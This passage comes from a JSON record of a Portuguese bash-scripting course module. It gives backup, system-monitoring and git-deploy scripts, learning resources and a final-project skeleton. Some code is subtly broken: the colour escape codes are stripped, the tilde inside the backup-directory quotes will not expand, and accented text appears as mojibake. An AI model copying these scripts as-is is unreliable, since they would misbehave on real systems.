$TOTAL_FAILED\"\nlog \"INFO\" \"Backups antigos removidos: $OLD_BACKUPS\"\nlog \"INFO\" \"Uso de disco: $disk_usage%\"\n\nif [ \"$TOTAL_FAILED\" -gt 0 ]; then\n    log \"ERROR\" \"Backup completado com falhas!\"\n    send_alert \"ALERTA: Falhas no backup\" \"$TOTAL_FAILED backups falharam. Verifique $LOG_FILE\"\n    exit 1\nelse\n    log \"INFO\" \"Backup completado com sucesso!\"\n    exit 0\nfi\n```\n\n#### **Exemplo 2: Monitor de Sistema Avan√ßado**\n\n```bash\n#!/bin/bash\n# monitor_avancado.sh\n\n# Configura√ß√µes\nALERT_CPU=85\nALERT_MEMORY=90\nALERT_DISK=95\nCHECK_INTERVAL=60  # segundos\nLOG_FILE=\"/var/log/system_monitor.log\"\n\n# Cores para sa√≠da\nRED='\\'\nGREEN='\\'\nYELLOW='\\'\nBLUE='\\'\nNC='\\'  # No Color\n\n# Fun√ß√£o para coletar m√©tricas\nget_metrics() {\n    # CPU\n    local cpu_usage=$(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}' | cut -d'%' -f1)\n    \n    # Mem√≥ria\n    local mem_total=$(free -m | awk '/Mem:/ {print $2}')\n    local mem_used=$(free -m | awk '/Mem:/ {print $3}')\n    local mem_percent=$(echo \"scale=2; $mem_used / $mem_total * 100\" | bc)\n    \n    # Disco\n    local disk_usage=$(df -h / | awk 'NR==2 {print $5}' | sed 's/%//')\n    \n    # Load average\n    local load=$(uptime | awk -F'load average:' '{print $2}')\n    \n    # Temperatura (se dispon√≠vel)\n    local temp=\"N/A\"\n    if command -v sensors >/dev/null 2>&1; then\n        temp=$(sensors | grep -E \"Core|Package\" | awk '{print $3}' | head -1)\n    fi\n    \n    # Retornar como string delimitada\n    echo \"$cpu_usage:$mem_percent:$disk_usage:$load:$temp\"\n}\n\n# Fun√ß√£o para verificar alertas\ncheck_alerts() {\n    local metrics=\"$1\"\n    IFS=':' read -r cpu mem disk load temp <<< \"$metrics\"\n    \n    local alerts=()\n    \n    # Verificar CPU\n    if (( $(echo \"$cpu > $ALERT_CPU\" | bc -l) )); then\n        alerts+=(\"CPU: ${cpu}% (> ${ALERT_CPU}%)\")\n    fi\n    \n    # Verificar mem√≥ria\n    if (( $(echo \"$mem > $ALERT_MEMORY\" | bc -l) )); then\n        alerts+=(\"Mem√≥ria: ${mem}% (> ${ALERT_MEMORY}%)\")\n    fi\n    \n    # Verificar disco\n    if (( $(echo \"$disk > $ALERT_DISK\" | bc -l) )); then\n        alerts+=(\"Disco: ${disk}% (> ${ALERT_DISK}%)\")\n    fi\n    \n    # Verificar load average\n    local load1=$(echo \"$load\" | awk -F, '{print $1}' | xargs)\n    local cores=$(nproc)\n    local load_threshold=$(echo \"$cores * 1.5\" | bc)\n    \n    if (( $(echo \"$load1 > $load_threshold\" | bc -l) )); then\n        alerts+=(\"Load average: $load1 (> $load_threshold)\")\n    fi\n    \n    # Retornar alertas\n    if [ ${#alerts[@]} -gt 0 ]; then\n        printf \"%s\n\" \"${alerts[@]}\"\n    fi\n}\n\n# Fun√ß√£o para exibir dashboard\ndisplay_dashboard() {\n    clear\n    echo -e \"${BLUE}=== MONITOR DO SISTEMA ===${NC}\"\n    echo -e \"Data: $(date '+%Y-%m-%d %H:%M:%S')\"\n    echo -e \"Intervalo: ${CHECK_INTERVAL}s\"\n    echo \"\"\n    \n    # Coletar m√©tricas\n    local metrics=$(get_metrics)\n    IFS=':' read -r cpu mem disk load temp <<< \"$metrics\"\n    \n    # Exibir m√©tricas\n    echo -e \"${GREEN}M√âTRICAS DO SISTEMA:${NC}\"\n    printf \"CPU:     %6s%%\n\" \"$cpu\"\n    printf \"Mem√≥ria: %6s%%\n\" \"$mem\"\n    printf \"Disco:   %6s%%\n\" \"$disk\"\n    printf \"Load:    %6s\n\" \"$load\"\n    printf \"Temp:    %6s\n\" \"$temp\"\n    echo \"\"\n    \n    # Verificar e exibir alertas\n    local alerts=$(check_alerts \"$metrics\")\n    if [ -n \"$alerts\" ]; then\n        echo -e \"${RED}‚ö†Ô∏è  ALERTAS:${NC}\"\n        echo \"$alerts\"\n        echo \"\"\n        \n        # Registrar alertas no log\n        echo \"[$(date '+%Y-%m-%d %H:%M:%S')] ALERTAS: $alerts\" >> \"$LOG_FILE\"\n    else\n        echo -e \"${GREEN}‚úÖ Sistema operando normalmente${NC}\"\n        echo \"\"\n    fi\n    \n    # Top 5 processos por CPU\n    echo -e \"${BLUE}TOP 5 PROCESSOS (CPU):${NC}\"\n    ps aux --sort=-%cpu | head -6 | awk 'NR>1 {printf \"%-10s %-6s %s\n\", $11, $3\"%\", $1}'\n    echo \"\"\n    \n    # Top 5 processos por mem√≥ria\n    echo -e \"${BLUE}TOP 5 PROCESSOS (MEM√ìRIA):${NC}\"\n    ps aux --sort=-%mem | head -6 | awk 'NR>1 {printf \"%-10s %-6s %s\n\", $11, $4\"%\", $1}'\n    echo \"\"\n    \n    # Espa√ßo em disco\n    echo -e \"${BLUE}ESPA√áO EM DISCO:${NC}\"\n    df -h | grep -E \"^Filesystem|^/dev\" | head -5\n}\n\n# Loop principal\nwhile true; do\n    display_dashboard\n    sleep \"$CHECK_INTERVAL\"\ndone\n```\n\n#### **Exemplo 3: Script de Deploy Autom√°tico**\n\n```bash\n#!/bin/bash\n# deploy_automatico.sh\n\nset -euo pipefail\n\n# Configura√ß√µes\nPROJECT_DIR=\"/var/www/meu_projeto\"\nBACKUP_DIR=\"/backup/deploys\"\nGIT_REPO=\"https://github.com/usuario/projeto.git\"\nBRANCH=\"main\"\nLOG_FILE=\"/var/log/deploy.log\"\n\n# Fun√ß√µes\nlog() {\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\nbackup_project() {\n    local timestamp=$(date +%Y%m%d_%H%M%S)\n    local backup_file=\"$BACKUP_DIR/projeto_$timestamp.tar.gz\"\n    \n    log \"Criando backup do projeto atual...\"\n    \n    if [ -d \"$PROJECT_DIR\" ]; then\n        tar -czf \"$backup_file\" -C \"$(dirname \"$PROJECT_DIR\")\" \"$(basename \"$PROJECT_DIR\")\"\n        log \"Backup criado: $backup_file\"\n    else\n        log \"Diret√≥rio do projeto n√£o existe, pulando backup\"\n    fi\n}\n\ndeploy_project() {\n    log \"Iniciando deploy...\"\n    \n    # Criar diret√≥rio se n√£o existir\n    mkdir -p \"$PROJECT_DIR\"\n    \n    # Entrar no diret√≥rio\n    cd \"$PROJECT_DIR\"\n    \n    # Verificar se √© reposit√≥rio git\n    if [ -d \".git\" ]; then\n        log \"Atualizando reposit√≥rio existente...\"\n        git fetch origin\n        git checkout \"$BRANCH\"\n        git reset --hard \"origin/$BRANCH\"\n        git pull origin \"$BRANCH\"\n    else\n        log \"Clonando reposit√≥rio...\"\n        git clone \"$GIT_REPO\" .\n        git checkout \"$BRANCH\"\n    fi\n    \n    log \"Deploy conclu√≠do\"\n}\n\ninstall_dependencies() {\n    log \"Instalando depend√™ncias...\"\n    cd \"$PROJECT_DIR\"\n    \n    # Verificar tipo de projeto\n    if [ -f \"package.json\" ]; then\n        log \"Projeto Node.js detectado\"\n        if command -v npm >/dev/null 2>&1; then\n            npm install --production\n            log \"Depend√™ncias Node.js instaladas\"\n        else\n            log \"ERRO: npm n√£o encontrado\"\n            return 1\n        fi\n    fi\n    \n    if [ -f \"requirements.txt\" ]; then\n        log \"Projeto Python detectado\"\n        if command -v pip3 >/dev/null 2>&1; then\n            pip3 install -r requirements.txt\n            log \"Depend√™ncias Python instaladas\"\n        else\n            log \"ERRO: pip3 n√£o encontrado\"\n            return 1\n        fi\n    fi\n    \n    if [ -f \"composer.json\" ]; then\n        log \"Projeto PHP detectado\"\n        if command -v composer >/dev/null 2>&1; then\n            composer install --no-dev --optimize-autoloader\n            log \"Depend√™ncias PHP instaladas\"\n        else\n            log \"ERRO: composer n√£o encontrado\"\n            return 1\n        fi\n    fi\n    \n    log \"Depend√™ncias instaladas com sucesso\"\n}\n\nrestart_services() {\n    log \"Reiniciando servi√ßos...\"\n    \n    # Verificar servi√ßos relacionados\n    if systemctl is-active --quiet nginx; then\n        sudo systemctl reload nginx\n        log \"Nginx recarregado\"\n    fi\n    \n    if systemctl is-active --quiet apache2; then\n        sudo systemctl reload apache2\n        log \"Apache recarregado\"\n    fi\n    \n    # Projeto espec√≠fico\n    if [ -f \"package.json\" ] && [ -f \"ecosystem.config.js\" ]; then\n        if command -v pm2 >/dev/null 2>&1; then\n            pm2 restart all\n            log \"Aplica√ß√£o PM2 reiniciada\"\n        fi\n    fi\n    \n    log \"Servi√ßos reiniciados\"\n}\n\n# Execu√ß√£o principal\nlog \"=== INICIANDO DEPLOY AUTOM√ÅTICO ===\"\n\n# 1. Backup\nbackup_project\n\n# 2. Deploy\ndeploy_project\n\n# 3. Depend√™ncias\ninstall_dependencies\n\n# 4. Reiniciar servi√ßos\nrestart_services\n\n# 5. Verifica√ß√£o final\nlog \"Verificando status...\"\nif [ -d \"$PROJECT_DIR\" ] && [ -d \"$PROJECT_DIR/.git\" ]; then\n    cd \"$PROJECT_DIR\"\n    commit_hash=$(git rev-parse --short HEAD)\n    log \"Deploy conclu√≠do! Commit: $commit_hash\"\nelse\n    log \"ERRO: Deploy pode ter falhado\"\n    exit 1\nfi\n\nlog \"=== DEPLOY CONCLU√çDO COM SUCESSO ===\"\nexit 0\n```\n\n### üìû SUPORTE E RECURSOS\n\n#### **Canais de Ajuda:**\n\n```bash\n# Manual oficial do comando\n$ man comando\n$ man ls\n$ man grep\n\n# Ajuda r√°pida\n$ comando --help\n$ ls --help\n$ grep --help\n\n# Buscar por comandos relacionados\n$ apropos palavra\n$ apropos network\n$ apropos process\n\n# Descri√ß√£o breve\n$ whatis comando\n$ whatis ls\n$ whatis chmod\n\n# Info pages (mais detalhado que man)\n$ info comando\n$ info coreutils\n```\n\n#### **Comunidades e F√≥runs:**\n- **Stack Overflow** - Tags: [bash], [shell], [linux]\n- **Unix & Linux Stack Exchange**\n- **Reddit** - r/commandline, r/bash, r/linuxadmin\n- **F√≥runs espec√≠ficos da distribui√ß√£o** (Ubuntu Forums, Arch Forums, etc.)\n- **GitHub** - Issues e discuss√µes em projetos open source\n\n#### **Pratique Online:**\n```bash\n# Wargames para aprendizado pr√°tico\n$ # OverTheWire Bandit - https://overthewire.org/wargames/bandit/\n$ # PicoCTF - https://picoctf.org/\n\n# Sites interativos\n$ # Explain Shell - https://explainshell.com/\n$ # ShellCheck - https://www.shellcheck.net/\n$ # Linux Journey - https://linuxjourney.com/\n$ # Cmd Challenge - https://cmdchallenge.com/\n\n# Ambientes de pr√°tica\n$ # Docker containers isolados\n$ docker run -it ubuntu bash\n$ # Vagrant VMs\n$ vagrant init ubuntu/focal64\n$ # AWS/GCP free tier\n```\n\n#### **üìñ Leitura Recomendada:**\n- **Livro:** \"The Linux Command Line\" por William Shotts (gratuito online)\n- **Livro:** \"Bash Guide for Beginners\" por Machtelt Garrels\n- **Livro:** \"Advanced Bash-Scripting Guide\"\n- **Site:** Linux Documentation Project (tldp.org)\n- **Blog:** Linuxize (linuxize.com)\n- **Newsletter:** Linux Weekly News (lwn.net)\n\n#### **Ferramentas Essenciais:**\n```bash\n# ShellCheck - Analisador est√°tico de scripts\n$ sudo apt install shellcheck  # Debian/Ubuntu\n$ sudo yum install shellcheck  # RHEL/CentOS\n$ shellcheck meu_script.sh\n\n# Bat - Cat melhorado\n$ sudo apt install bat  # Debian/Ubuntu\n$ bat arquivo.txt\n\n# Exa - LS melhorado\n$ sudo apt install exa  # Debian/Ubuntu\n$ exa -la --git\n\n# Fd - Find melhorado\n$ sudo apt install fd-find  # Debian/Ubuntu\n$ fd \"*.txt\"\n\n# Ripgrep - Grep melhorado\n$ sudo apt install ripgrep  # Debian/Ubuntu\n$ rg \"padr√£o\"\n\n# JQ - Processador JSON\n$ sudo apt install jq  # Debian/Ubuntu\n$ curl api.com/data.json | jq '.items[]'\n\n# Htop/Top melhorados\n$ sudo apt install htop glances\n$ htop\n$ glances\n```\n\n### üèÜ PROJETO FINAL: SISTEMA DE MONITORAMENTO COMPLETO\n\n**Desafio:** Crie um sistema que:\n\n1. **Coleta m√©tricas** (CPU, mem√≥ria, disco, rede, processos)\n2. **Armazena hist√≥rico** em banco de dados simples (SQLite/CSV)\n3. **Envia alertas** por email/Telegram quando limites s√£o excedidos\n4. **Gera relat√≥rios** di√°rios/semanais/mensais\n5. **Interface web simples** para visualiza√ß√£o\n6. **Totalmente automatizado** via cron\n\n**Estrutura sugerida:**\n```\nmeu_monitor/\n‚îú‚îÄ‚îÄ monitor.sh          # Script principal de coleta\n‚îú‚îÄ‚îÄ config.conf         # Configura√ß√µes\n‚îú‚îÄ‚îÄ alertas.sh          # Sistema de alertas\n‚îú‚îÄ‚îÄ relatorios/         # Relat√≥rios gerados\n‚îÇ   ‚îú‚îÄ‚îÄ diario/\n‚îÇ   ‚îú‚îÄ‚îÄ semanal/\n‚îÇ   ‚îî‚îÄ‚îÄ mensal/\n‚îú‚îÄ‚îÄ logs/               # Logs de execu√ß√£o\n‚îÇ   ‚îú‚îÄ‚îÄ sistema.log\n‚îÇ   ‚îî‚îÄ‚îÄ alertas.log\n‚îú‚îÄ‚îÄ web/                # Interface web simples\n‚îÇ   ‚îú‚îÄ‚îÄ index.html\n‚îÇ   ‚îú‚îÄ‚îÄ estilo.css\n‚îÇ   ‚îî‚îÄ‚îÄ graficos.js\n‚îú‚îÄ‚îÄ database/           # Armazenamento de dados\n‚îÇ   ‚îî‚îÄ‚îÄ metricas.db     # SQLite\n‚îî‚îÄ‚îÄ install.sh          # Script de instala√ß√£o\n```\n\n**Comece com este esqueleto:**\n```bash\n#!/bin/bash\n# sistema_monitor.sh - Esqueleto inicial\n\nset -euo pipefail\n\n# Configura√ß√£o\nCONFIG_FILE=\"config.conf\"\nLOG_DIR=\"logs\"\nDB_FILE=\"database/metricas.db\"\n\n# Carregar configura√ß√£o\nif [ -f \"$CONFIG_FILE\" ]; then\n    source \"$CONFIG_FILE\"\nelse\n    # Valores padr√£o\n    ALERTA_CPU=80\n    ALERTA_MEMORIA=90\n    ALERTA_DISCO=85\n    INTERVALO=300  # 5 minutos\n    EMAIL_ADMIN=\"admin@empresa.com\"\nfi\n\n# Fun√ß√µes\nget_metrics() {\n    # Implementar coleta de m√©tricas\n    echo \"CPU:$cpu MEM:$mem DISK:$disk\"\n}\n\nsave_to_db() {\n    local metrics=\"$1\"\n    # Salvar no banco de dados\n    echo \"$(date),$metrics\" >> \"$DB_FILE\"\n}\n\ncheck_alerts() {\n    local metrics=\"$1\"\n    # Verificar se precisa enviar alertas\n    echo \"Verificando alertas...\"\n}\n\ngenerate_report() {\n    # Gerar relat√≥rio di√°rio\n    echo \"Gerando relat√≥rio...\"\n}\n\n# Menu principal\ncase \"${1:-monitor}\" in\n    monitor)\n        echo \"Iniciando monitoramento...\"\n        while true; do\n            metrics=$(get_metrics)\n            save_to_db \"$metrics\"\n            check_alerts \"$metrics\"\n            sleep \"$INTERVALO\"\n        done\n        ;;\n    report)\n        generate_report\n        ;;\n    status)\n        echo \"Status do sistema...\"\n        get_metrics\n        ;;\n    *)\n        echo \"Uso: $0 {monitor|report|status}\"\n        exit 1\n        ;;\nesac\n```\n\n### üåü PARAB√âNS, EXPLORADOR!\n\nVoc√™ completou a jornada completa do Shell Script. Agora voc√™ tem:\n\n#### ‚úÖ **HABILIDADES CONQUISTADAS:**\n1. üó∫Ô∏è **Navega√ß√£o fluida** no sistema de arquivos\n2. üõ†Ô∏è **Cria√ß√£o e gerenciamento** de arquivos/diret√≥rios\n3. üîç **Busca e an√°lise** avan√ßada de conte√∫do\n4. üõ°Ô∏è **Controle total** de permiss√µes e seguran√ßa\n5. ‚ö° **Automa√ß√£o poderosa** com scripts\n6. üï∞Ô∏è **Agendamento inteligente** de tarefas\n7. üìä **Monitoramento profissional** de sistemas\n8. üîí **Pr√°ticas de seguran√ßa** robustas\n9. üöÄ **Otimiza√ß√£o** de comandos e scripts\n10. üîß **Administra√ß√£o completa** de sistemas Linux\n\n#### üöÄ **PR√ìXIMOS PASSOS:**\n1. **Automatize seu workflow** - Identifique tarefas repetitivas e crie scripts\n2. **Contribua com open source** - Melhore scripts existentes na comunidade\n3. **Explore Python para automa√ß√£o** - Para tarefas mais complexas\n4. **Aprenda Ansible/Puppet** - Para gerenciamento de configura√ß√£o em escala\n5. **Crie seus pr√≥prios tools** - Desenvolva utilit√°rios que resolvam seus problemas\n6. **Mentore outros** - Compartilhe seu conhecimento\n\n#### üí° **LEMBRE-SE SEMPRE:**\n> \"O verdadeiro poder do terminal n√£o est√° em memorizar comandos, mas em entender como pensar em solu√ß√µes. Cada problema √© uma oportunidade para criar uma nova ferramenta.\"\n\n**Continue explorando!** O mundo do Shell Script √© infinito. Cada linha de comando que voc√™ escreve hoje pode se tornar a ferramenta que transforma seu trabalho amanh√£.\n\n**Boa sorte em suas explora√ß√µes! Que seus scripts sejam elegantes, seus backups sejam confi√°veis e seus sistemas estejam sempre saud√°veis!** üéâ\n\n---\n\n**üìû Suporte Cont√≠nuo:**\n- Revise os exemplos sempre que tiver d√∫vidas\n- Pratique regularmente para manter a flu√™ncia\n- Participe de comunidades para aprender com outros\n- Nunca pare de explorar novos comandos e t√©cnicas\n\n**üèÅ Seu certificado de explorador est√° garantido!**",
    "examples": "```bash\n# Exemplo r√°pido: Diagn√≥stico completo em 1 comando\n#!/bin/bash\n# diagnostico_rapido.sh\n\necho \"=== DIAGN√ìSTICO R√ÅPIDO DO SISTEMA ===\"\necho \"Data: $(date)\"\necho \"\"\n\necho \"1. Sistema:\"\nuptime\necho \"\"\n\necho \"2. Mem√≥ria:\"\nfree -h | awk 'NR<=2 {print}'\necho \"\"\n\necho \"3. Disco:\"\ndf -h | grep -E '^/dev/|Filesystem'\necho \"\"\n\necho \"4. Processos cr√≠ticos:\"\nfor proc in sshd nginx mysql; do\n    if pgrep \"$proc\" >/dev/null; then\n        echo \"‚úÖ $proc: ATIVO\"\n    else\n        echo \"‚ùå $proc: INATIVO\"\n    fi\ndone\necho \"\"\n\necho \"5. Logs recentes:\"\ntail -5 /var/log/syslog 2>/dev/null | sed 's/^/   /'\necho \"\"\n\necho \"Diagn√≥stico conclu√≠do em $(date '+%H:%M:%S')\"\n\n# Exemplo: Backup r√°pido de configura√ß√µes importantes\n#!/bin/bash\n# backup_configs_rapido.sh\n\nBACKUP_DIR=\"~/backup_configs_$(date +%Y%m%d)\"\nmkdir -p \"$BACKUP_DIR\"\n\necho \"Fazendo backup de configura√ß√µes...\"\n\n# Configura√ß√µes importantes\ncp /etc/ssh/sshd_config \"$BACKUP_DIR/\" 2>/dev/null\ncp /etc/hosts \"$BACKUP_DIR/\" 2>/dev/null\ncp ~/.bashrc \"$BACKUP_DIR/\" 2>/dev/null\ncp ~/.ssh/config \"$BACKUP_DIR/\" 2>/dev/null  # se existir\n\n# Crontab do usu√°rio\ncrontab -l > \"$BACKUP_DIR/crontab_backup.txt\" 2>/dev/null\n\n# Listar pacotes instalados\ndpkg --get-selections > \"$BACKUP_DIR/pacotes_instalados.txt\" 2>/dev/null || \\\nrpm -qa > \"$BACKUP_DIR/pacotes_instalados.txt\" 2>/dev/null\n\n# Compactar\ntar -czf \"backup_configs_$(date +%Y%m%d).tar.gz\" -C ~ \"backup_configs_$(date +%Y%m%d)\"\nrm -rf \"$BACKUP_DIR\"\n\necho \"Backup salvo como: backup_configs_$(date +%Y%m%d).tar.gz\"\n\n# Exemplo: Monitor de sa√∫de em uma linha\nwatch -n 5 'echo \"CPU: $(top -bn1 | grep Cpu | awk \"{print \\$2}\")% | Mem: $(free -m | awk \"/Mem/ {printf \\\"%.1f%%\\\", \\$3/\\$2*100}\") | Disk: $(df -h / | awk \"NR==2 {print \\$5}\") | Load: $(uptime | awk -F\"load average:\" \"{print \\$2}\")\"'\n```",
    "summary": "Neste m√≥dulo final, voc√™ recebeu um cat√°logo completo organizado por problemas comuns e suas solu√ß√µes. Aprendeu a encontrar rapidamente comandos para monitorar recursos, compactar arquivos, localizar informa√ß√µes, fazer backups, instalar software e muito mais. Recebeu um √≠ndice completo de comandos essenciais e exemplos pr√°ticos prontos para uso, incluindo sistemas completos de backup, monitoramento e deploy. Tamb√©m explorou recursos para aprendizado cont√≠nuo e ferramentas que tornam o trabalho no terminal mais eficiente. Agora voc√™ est√° completamente equipado para resolver praticamente qualquer problema no terminal Linux/Unix.",
    "estimated_time_minutes": "120"
  }
]